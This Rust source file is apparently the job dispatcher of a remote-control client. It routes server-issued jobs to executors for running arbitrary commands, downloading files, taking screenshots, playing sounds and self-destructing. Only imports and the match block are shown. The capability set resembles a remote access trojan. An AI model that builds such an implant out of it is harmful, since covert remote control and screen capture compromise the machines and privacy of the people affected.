use common::api::{JobOutput, JobType};
use executors::command::execute_command;
use executors::download::download_file;
use executors::playsound::play_sound;
use executors::screenshot::screenshot;
use executors::selfdestruct::selfdestruct;

pub(crate) async fn pick_executor(job_type: &JobType) -> JobOutput {
    match job_type {
        JobType::Command(p) => { execute_command(p).await }
        JobType::SelfDestruct => { selfdestruct().await }
        
        JobType::DownloadFile(p) => { download_file(p).await }
        JobType::PlaySound(p) => { play_sound(p).await }
        JobType::ScreenShot => { screenshot().await }
    }
}